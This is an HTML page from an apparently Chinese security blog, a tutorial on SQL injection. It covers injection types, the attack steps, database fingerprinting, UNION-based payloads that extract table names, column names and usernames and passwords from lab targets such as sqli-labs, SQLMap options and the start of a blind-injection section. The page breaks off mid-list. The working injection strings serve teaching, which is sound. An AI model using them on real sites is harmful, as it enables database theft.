@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+		
+<title>WEB安全系列-[SQL注入]-军军Z1</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/image/favicon.ico">
+
+<meta name="keywords" content="web安全，笔记，web，前端，黑客，编程，内网安全，内网渗透，sql注入，xss，文件上传">
+<meta name="description" content="描述">
+
+
+<script src="/js/jquery.min.js"></script>
+
+
+
+<!-- Baidu Analytics -->
+<script defer>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?4b5fe1472f22fa";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+	<meta name="generator" content="Hexo 6.1.0"></head>
+
+	<body>
+		
+<link rel="stylesheet" href="/css/page.css">
+
+
+<link rel="stylesheet" href="/css/page_cente.css">
+
+
+<link rel="stylesheet" href="/css/atom-one-dark.css">
+
+
+<link rel="stylesheet" href="/css/header.css">
+
+	<div class="header">
+		<div class="header-top">
+			<div class="h-left">
+				<a href="/">
+					<img src="/image/logo.png" alt="Quiet">
+				</a>
+			</div>
+			<div class="h-right">
+				<ul>
+					
+						
+								<li>
+									<a href="/">
+										主页
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/archives">
+										存档
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/categories">
+										分类
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/tags">
+										标签
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/links">
+										资源导航
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/about">
+										关于
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+				</ul>
+			</div>
+			<div class="h-right-close">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+					<path fill="none" d="M0 0h24v24H0z" />
+					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
+				</svg>
+			</div>
+		</div>
+	</div>
+	<div class="sidebar">
+    <div class="topo">
+        <h2>军军Z1</h2>
+    </div>
+    <ul>
+        
+        <li>
+            <a href="/">主页</a>
+        </li>
+        
+        <li>
+            <a href="/archives">存档</a>
+        </li>
+        
+        <li>
+            <a href="/categories">分类</a>
+        </li>
+        
+        <li>
+            <a href="/tags">标签</a>
+        </li>
+        
+        <li>
+            <a href="/links">资源导航</a>
+        </li>
+        
+        <li>
+            <a href="/about">关于</a>
+        </li>
+        
+    </ul>
+    <div class="my_foot">
+        
+        <a target="_blank" rel="noopener" href="https://github.com/qiaobug">
+            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+        </a>
+        
+    </div>
+</div>
+<div class='shelter'
+    style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'>
+</div>
+<style>
+    .sidebar {
+        width: 0;
+        height: 100%;
+        position: fixed;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        background: #fff;
+        z-index: 999;
+        text-align: center;
+        box-shadow: -6px 0 20px rgba(98, 94, 94, .815)
+    }
+
+    .topo {
+        width: 100%;
+        height: 200px;
+        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
+        background-size: 100% 100%;
+        position: relative;
+        display: flex;
+        align-items: flex-end
+    }
+
+    .topo h2 {
+        color: #fff;
+        z-index: 1;
+        position: relative;
+        margin: 0 0 10px 10px;
+        font-size: 1.2em;
+        box-sizing: border-box
+    }
+
+    .topo:before {
+        content: '';
+        background-image: url(/image/pattern.png);
+        background-repeat: repeat;
+        height: 100%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        width: 100%;
+        z-index: 1
+    }
+
+    .sidebar ul {
+        width: 100%;
+        margin-top: 50px
+    }
+
+    .sidebar ul li {
+        height: 50px;
+        list-style: none;
+        font-size: 1.2em;
+        text-align: right;
+        margin-right: 10px
+    }
+
+    .sidebar ul li a {
+        display: grid;
+        color: #5d606a;
+        text-overflow: ellipsis;
+        width: 100%;
+        text-decoration: none
+    }
+
+    .my_foot {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        position: absolute;
+        bottom: 0
+    }
+
+    .my_foot a {
+        text-decoration: none;
+        margin-right: 10px;
+        display: inline-block
+    }
+
+    .my_foot a img {
+        width: 30px;
+        height: 30px
+    }
+</style>
+
+<script>
+    $(function () { $('.h-right-close>svg').click(function () { $('.sidebar').animate({ width: "66%" }, 500); $('.shelter').fadeIn("slow") }); $('.shelter').click(function (e) { $('.sidebar').animate({ width: "0" }, 500); $('.shelter').fadeOut("slow") }) })
+</script>
+		<script>
+			$(function () { $(window).scroll(function () { if ($(document).scrollTop() > 100) { $(".header-top").removeClass("header-move2"); $('.header-top').addClass('header-move1') } else { $(".header-top").removeClass("header-move1"); $('.header-top').addClass('header-move2') } }) });
+		</script>
+<div class="header-bg ">
+    <div class="bg-content">
+        <ul class="tag">
+            
+        </ul>
+        <h1>WEB安全系列-[SQL注入]</h1>
+        <div class="article-info">
+            <div class="article-author">
+                
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20">
+                    <g>
+                        <path fill="#12183A"
+                            d="M6.187 15.265A6.47 6.47 0 0 0 10 16.5a6.47 6.47 0 0 0 3.813-1.235A4.99 4.99 0 0 0 10 13.5a4.99 4.99 0 0 0-3.813 1.765zM5.082 14.25A6.485 6.485 0 0 1 10 12c1.965 0 3.726.872 4.918 2.25a6.5 6.5 0 1 0-9.836 0zM10 18a8 8 0 1 1 0-16 8 8 0 0 1 0 16zm0-7a3 3 0 1 1 0-6 3 3 0 0 1 0 6zm0-1.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3z">
+                        </path>
+                    </g>
+                </svg>
+                
+                <span> <a href="">军军Z1</a></span>
+                <p>2022-04-13 00:54:57</p>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="article-content">
+    <div id="article" class="content">
+        <h1 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。</p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
+<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>从注入手法分类可以分为：</strong></p>
+<blockquote>
+<p><strong>联合查询注入</strong></p>
+<p><strong>报错型注入</strong></p>
+<p><strong>布尔型注入</strong></p>
+<p><strong>延时注入</strong></p>
+<p><strong>堆叠注入</strong></p>
+<p><strong>Cookie注入</strong></p>
+<p><strong>HTTP头注入</strong></p>
+<p><strong>JSON注入</strong></p>
+<p><strong>POST注入</strong></p>
+<p><strong>二次注入</strong></p>
+<p><strong>DNS注入</strong></p>
+<p><strong>宽字节注入</strong></p>
+<p><strong>……</strong></p>
+</blockquote>
+<p><strong>从数据类型上可以分为：</strong></p>
+<blockquote>
+<p><strong>字符型（即输入的输入使用符号进行过滤）</strong></p>
+<p><strong>数值型（即输入的输入未使用符号进行过滤）</strong></p>
+</blockquote>
+<p><strong>从注入位置可以分类为：</strong></p>
+<blockquote>
+<p><strong>GET数据（提交数据方式为GET，大多存在地址栏）</strong></p>
+<p><strong>POST数据（提交数据方式为POST，大多存在输入框中）</strong></p>
+<p><strong>HTTP头部（提交数据方式为HTTP头部）</strong></p>
+<p><strong>cookie数据（提交数据方式为cookie）</strong></p>
+</blockquote>
+<h3 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h3><p>分为两类：危害数据库里的数据、直接危害到网站的权限(需要满足条件)</p>
+<ol>
+<li><p>数据库信息泄露</p>
+</li>
+<li><p>网页篡改：登陆后台后发布恶意内容</p>
+</li>
+<li><p>网站挂马 : 当拿到webshell时或者获取到服务器的权限以后，可将一些网页木马挂在服务器上，去攻击别人</p>
+</li>
+<li><p>私自添加系统账号</p>
+</li>
+<li><p>读写文件获取webshell</p>
+</li>
+</ol>
+<h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p>  SQL注入漏洞的产生需要满足以下两个条件：</p>
+<ul>
+<li>参数用户可控：前端传给后端的参数内容是用户可以控制的。</li>
+<li>参数参与数据库操作：传入的参数直接拼接到SQL语句后，带入数据库进行相关操作。</li>
+</ul>
+<h3 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h3><p><strong>1.注入点判断</strong>。</p>
+<p>​        不同类别的网站注入点存在的位置也可能不一样，但其都有脱离不了一点就是与数据库进行交互，所以与数据库发生交互操作的功能点都有可能存在SQL注入，常出现注入点的位置有：新闻公告等查询处、用户注册处、用户登录处等等。</p>
+<p><strong>2.判断SQL语句中的列数</strong>。</p>
+<pre><code>   注入点正常实现的数据往往不是我们想要得到的数据，通常我们需要使用`union`或报错等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道原SQL语句中的列数，否则SQL执行时会发生错误。
+</code></pre>
+<p><strong>3.判断SQL语句操作的回显位置</strong>。</p>
+<p>​        使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来，同样使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到这样的一个点。</p>
+<p><strong>4.构造SQL注入获取数据库指纹等</strong>。</p>
+<p>​        在爆数据库内部信息时，需要先得到数据库用户名、版本、数据库名称等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</p>
+<p><strong>5.构造SQL语句爆数据表名</strong>。</p>
+<p>​        对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</p>
+<p><strong>6.构造SQL语句爆字段名</strong>。</p>
+<p>​        在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</p>
+<p><strong>7.构造SQL语句爆字段值</strong>。</p>
+<p>​        爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的数据</p>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>判断注入点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">and 1=1  页面正常</span><br><span class="line">and 1=2 页面错误</span><br><span class="line"></span><br><span class="line">SELECT * FROM user WHERE id=1 and 1=1 LIMIT 0,1 正常</span><br><span class="line">SELECT * FROM user WHERE id=1 and 1=2 LIMIT 0,1 错误</span><br><span class="line"></span><br><span class="line">(有一个正常，整个语句都为真)</span><br><span class="line">SELECT * FROM user WHERE id=1 or 1=1 LIMIT 0,1 正常</span><br><span class="line">SELECT * FROM user WHERE id=1 or 1=2 LIMIT 0,1 正常</span><br></pre></td></tr></table></figure>
+
+<p><strong>判断字段数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>常用的SQL数据库函数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="判断SQL数据库类型"><a href="#判断SQL数据库类型" class="headerlink" title="判断SQL数据库类型"></a>判断SQL数据库类型</h1><p><strong>前端与数据库类型</strong><br>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，PostgreSQL<br>java：Oracle，MySQL</p>
+<p><strong>根据端口判断</strong><br>Oracle：默认端口1521<br>SQL Server：默认端口1433<br>MySQL：默认端口3306</p>
+<p><strong>根据数据库特有函数来判断</strong><br>len和length<br>len()：SQL Server 、MySQL以及db2返回长度的函数。<br>length()：Oracle和INFORMIX返回长度的函数。</p>
+<p><strong>version和@@version</strong><br>version()：MySQL查询版本信息的函数<br>@@version：MySQL和SQL Server查询版本信息的函数</p>
+<p><strong>substring和substr</strong><br>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p>
+<p><strong>根据特殊符号进行判断</strong><br><strong>&#x2F;</strong>*  是MySQL数据库的注释符<br><strong>–</strong>  是Oracle和SQL Server支持的注释符<br><strong>; ** 是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br><strong>#</strong>  是MySQL中的注释符，返回错误则说明可能不是MySQL，另外也支持– 和&#x2F;</strong>&#x2F;</p>
+<h1 id="SQL注入利用"><a href="#SQL注入利用" class="headerlink" title="SQL注入利用"></a>SQL注入利用</h1><p> <img src="/../../images/SQL%E6%B3%A8%E5%85%A5/MYSQL%E6%B3%A8%E5%85%A5.png" alt="img"> </p>
+<h3 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h3><p> <code>union</code>操作符用于合并两个或多个SQL语句，得到<strong>联合查询结果</strong> </p>
+<ol>
+<li><p><strong>利用order判断字段数</strong></p>
+<p>order by x(数字） 正常与错误的正常值  正确网页正常显示，错误网页报错</p>
+<p>?id&#x3D;1’ order by 3–+</p>
+</li>
+<li><p><strong>利用 union select 联合查询，将id值设置成不成立，即可探测到可利用的字段数</strong></p>
+<p>?id&#x3D;-1 union select 1,2,3 –+</p>
+</li>
+<li><p><strong>利用函数database(),user(),version()可以得到所探测数据库的数据库名、用户名和版本号</strong></p>
+<p>?id&#x3D;-1 union select 1,database(),version() –+</p>
+</li>
+<li><p><strong>利用 union select 联合查询，获取表名</strong>  </p>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’已知库名’–+</p>
+</li>
+<li><p><strong>利用 union select 联合查询，获取列名</strong></p>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’已知表名’–+</p>
+</li>
+<li><p><strong>利用 union select 联合查询，获取字段值</strong></p>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(已知字段名,’:’已知字段名) from 已知表名–+</p>
+</li>
+</ol>
+<h3 id="高权限注入"><a href="#高权限注入" class="headerlink" title="高权限注入"></a>高权限注入</h3><p>​        MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作。其中也会遇到很多阻碍，相关防御方案也要明确，所谓知己知彼,百战不殆。不论作为攻击还是防御都需要了解其中的手法和原理，这样才是一个合格的安全工作者。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1272951/1621404478267-41dfa830-312e-42bf-a4b3-366e08be8d2c.png?x-oss-process=image/resize,w_1102/resize,w_928,limit_0" alt="img"> </p>
+<p><strong>MySQL 5.x数据结构</strong></p>
+<ol>
+<li><p>在MySQL 5.0以上版本中，为了方便管理，默认定义了information_schema数据 库，用来存储数据库元信息，其中具有表schemata（数据库名），table（表名），columns（列名或字段名）</p>
+</li>
+<li><p>在schemata表中，schema_name字段用来存储数据库名</p>
+</li>
+<li><p>在table表中，table_schema和table_name分别用来存储数据库名和表名</p>
+</li>
+<li><p>在column表中，table_schema（数据库名），table_name（表名），column_name（字段名）</p>
+</li>
+<li><p>获取所有数据库名</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>获取指定数据库下的表名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;pikachu&#x27;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>获取指定数据库指定表名下的列名信息</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns where  table_name=&#x27;users&#x27; and table_schema=&#x27;pikachu&#x27;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>获取指定列下的字段信息</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,username,password from users  LIMIT 1,1 --+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="WEB漏洞—类型及提交注入"><a href="#WEB漏洞—类型及提交注入" class="headerlink" title="WEB漏洞—类型及提交注入"></a>WEB漏洞—类型及提交注入</h1><pre><code>     **在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方 法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取， 后续安全测试中我们也必须满足同等的操作才能进行注入** 
+</code></pre>
+<h3 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="简要明确参数类型"></a><strong>简要明确参数类型</strong></h3><p><strong>根据网站上的参数或者值来判定注入的时候是否需要考虑符号的问题</strong></p>
+<p><strong>数字，字符，搜索，JSON 等</strong></p>
+<h3 id="数字-x2F-字符"><a href="#数字-x2F-字符" class="headerlink" title="数字&#x2F;字符"></a><strong>数字&#x2F;字符</strong></h3><p>数字型：基本不用引号，但是也不是绝对的，数字也可以加单引号</p>
+<p>字符型：一般采用单引号，但是不单止单引号 也可以是 ‘,”,%,),}等</p>
+<p><strong>即使有注入也会带入单引号里，产生不了任何作用，所以我们要做的前提是先要把它的符号闭合掉</strong></p>
+<p>select * from user where id &#x3D;1;</p>
+<p>select * from user where name&#x3D;’xiaojun’;</p>
+<p><img src="D:/my_blog/source/images/sql%25E6%25B3%25A8%25E5%2585%25A5/8.png" alt="8"></p>
+<p>$name&#x3D;$_GET[‘x’];</p>
+<p>$sql&#x3D;<strong>“<strong>select * from user where name&#x3D;’$name’</strong>“;</strong></p>
+<p>这样的话，注入语句就被写到单引号中了，那么这条语句就没有作用了</p>
+<p>?x&#x3D;xiaojun and 1&#x3D;1</p>
+<p>select * from user where name&#x3D;’xiaojun and 1&#x3D;1’</p>
+<p><strong>and  1&#x3D;1原始的意义是应该拼接到SQL语句中形成一个逻辑判断的情况，由于单引号的出现导致语句写到单引号里面成为一个单纯的字符串，没有了任何意义.</strong></p>
+<p><strong>根据网站自身的参数的值来判断在注人的时候是否需要考虑符合的问题。</strong></p>
+<p><img src="D:/my_blog/source/images/sql%25E6%25B3%25A8%25E5%2585%25A5/9.png" alt="9"></p>
+<h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a><strong>搜索</strong></h3><p>​        <strong>将数据进行搜索并进行展示，搜索符号是%，在过滤的时候要过滤单引号和百分号，不然语句全部在单引号和百分号里</strong></p>
+<p>select * from user where name like ‘%xiaojun%’ </p>
+<h3 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="简要明确请求方法"></a><strong>简要明确请求方法</strong></h3><ul>
+<li><p><strong>GET,POST,COOKIE,REQUEST,HTTP</strong> 头等</p>
+</li>
+<li><p><strong>请求方法可以通过浏览器开发者模式查看数据包的前缀</strong></p>
+</li>
+</ul>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/10.png" alt="10"></p>
+<ul>
+<li><strong>一般情况下，大数据采用POST上传方式</strong></li>
+</ul>
+<p><strong>不同的请求方法，请求数据，类型，大小，都不一样</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET产生一个TCP数据包；POST产生两个TCP数据包。</span><br><span class="line">         对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；</span><br><span class="line">          而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。</span><br><span class="line">      	 GET方法无法接收POST的值</span><br><span class="line">   在POST情况下GET的值只要在网址后面就能接收</span><br><span class="line">   GET、POST接收单个</span><br><span class="line">   REQUEST 全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。</span><br></pre></td></tr></table></figure>
+
+<h3 id="GET和POST两种基本请求方法和区别："><a href="#GET和POST两种基本请求方法和区别：" class="headerlink" title="GET和POST两种基本请求方法和区别："></a>GET和POST两种基本请求方法和区别：</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/logsharing/p/8448446.html">https://www.cnblogs.com/logsharing/p/8448446.html</a></p>
+<h3 id="干扰符号"><a href="#干扰符号" class="headerlink" title="干扰符号"></a>干扰符号</h3><p> SQL 语句干扰符号：’,”,%,),}等，具体需看写法</p>
+<p>Less-1为例：</p>
+<ol>
+<li><p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and 1&#x3D;1</p>
+<p>报错语句： SELECT * FROM users WHERE id&#x3D;’1’  and 1&#x3D;1’ LIMIT 0,1 </p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/11.png" alt="11"></p>
+</li>
+<li><p>正确的SQL语句：<a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and ‘1’&#x3D;’1</p>
+</li>
+</ol>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/12.png" alt="12"></p>
+<ol start="3">
+<li>当然，这种方法显得麻烦，直接使用注释也可以起到同样的效果</li>
+</ol>
+<p>–+负责把后面的单引号注释掉</p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/13.png" alt="13"></p>
+<h3 id="POST注入："><a href="#POST注入：" class="headerlink" title="POST注入："></a><strong>POST注入</strong>：</h3><h3 id="COOKIE注入："><a href="#COOKIE注入：" class="headerlink" title="COOKIE注入："></a>COOKIE注入：</h3><h3 id="HTTP头注入："><a href="#HTTP头注入：" class="headerlink" title="HTTP头注入："></a>HTTP头注入：</h3><h3 id="JSON注入相关知识"><a href="#JSON注入相关知识" class="headerlink" title="JSON注入相关知识"></a>JSON注入相关知识</h3><p>a. 简介</p>
+<p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application&#x2F;json”</p>
+<p> JSON语法</p>
+<p>■数据在名称&#x2F;值对中</p>
+<p>■数据由逗号分隔</p>
+<p>■大括号保存对象</p>
+<p>■中括号保存数组</p>
+<p>JSON值</p>
+<p>■数字（整数或浮点数） {“age”:30 }</p>
+<p>■字符串（在双引号中） {“uname”:”yang”}</p>
+<p>■逻辑值（true 或 false） {“flag”:true }</p>
+<p>■数组（在中括号中）{“sites”:[{“name”:”yang”},{“name”:”ming”}]}</p>
+<p>■对象（在大括号中）JSON 对象在大括号（{}）中书写：</p>
+<p>■null  { “runoob”:null }</p>
+<p>d. JSON代码格式</p>
+<h3 id="SQLMap简单使用"><a href="#SQLMap简单使用" class="headerlink" title="SQLMap简单使用"></a>SQLMap简单使用</h3><p>● –is-dba 当前用户权限（是否为root权限）<br>● –dbs 所有数据库<br>● –current-db 网站当前数据库<br>● –users 所有数据库用户<br>● –current-user 当前数据库用户<br>● –random-agent 构造随机user-agent<br>● –passwords 数据库密码<br>● –proxy <a target="_blank" rel="noopener" href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>● –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
+<p><strong>常用方法：</strong></p>
+<p><img src="D:/my_blog/source/images/sql%25E6%25B3%25A8%25E5%2585%25A5/14.png" alt="14"></p>
+<p><strong>详细SQLMap使用：</strong></p>
+<h1 id="WEB漏洞—查询方式及盲注"><a href="#WEB漏洞—查询方式及盲注" class="headerlink" title="WEB漏洞—查询方式及盲注"></a>WEB漏洞—查询方式及盲注</h1><p><strong>前言</strong></p>
+<p>​            当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句</p>
+<p><strong>涉及知识点：</strong></p>
+<ul>
+<li><p><strong>报错盲注</strong></p>
+</li>
+<li><p><strong>延迟盲注</strong></p>
+</li>
+<li><p><strong>布尔盲注</strong></p>
+</li>
+</ul>
+<h3 id="ASCCI码表"><a href="#ASCCI码表" class="headerlink" title="ASCCI码表"></a>ASCCI码表</h3><p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/ascci.png" alt="1646537964629"></p>
+<p><strong>SQL语句</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select 查询数据</span><br><span class="line">在网站应用中进行数据显示查询效果</span><br><span class="line">例： select * from news wher id=$id</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert 插入数据</span><br><span class="line"></span><br><span class="line">在网站应用中进行用户注册添加等操作</span><br><span class="line">例：insert into news(id,url,text) values(2,&#x27;x&#x27;,&#x27;$t&#x27;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> 删除数据</span><br><span class="line"></span><br><span class="line">后台管理里面删除文章删除用户等操作</span><br><span class="line">例：<span class="keyword">delete</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> 更新数据</span><br><span class="line"></span><br><span class="line">会员或后台中心数据同步或缓存等操作</span><br><span class="line">例：<span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> pwd<span class="operator">=</span><span class="string">&#x27;$p&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 排列数据</span><br><span class="line"></span><br><span class="line">一般结合表名或列名进行数据排序操作</span><br><span class="line">例：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">order</span> <span class="keyword">by</span> $id</span><br><span class="line">例：<span class="keyword">select</span> id,name,price <span class="keyword">from</span> news <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">order</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><p>发现注入漏洞时，构造sql语句不回显类容，但是会打印报错语句</p>
+<p>目的：让错误信息返回数据库中的类容</p>
+<p>原理分析：</p>
+<ul>
+<li><p><strong>floor()</strong></p>
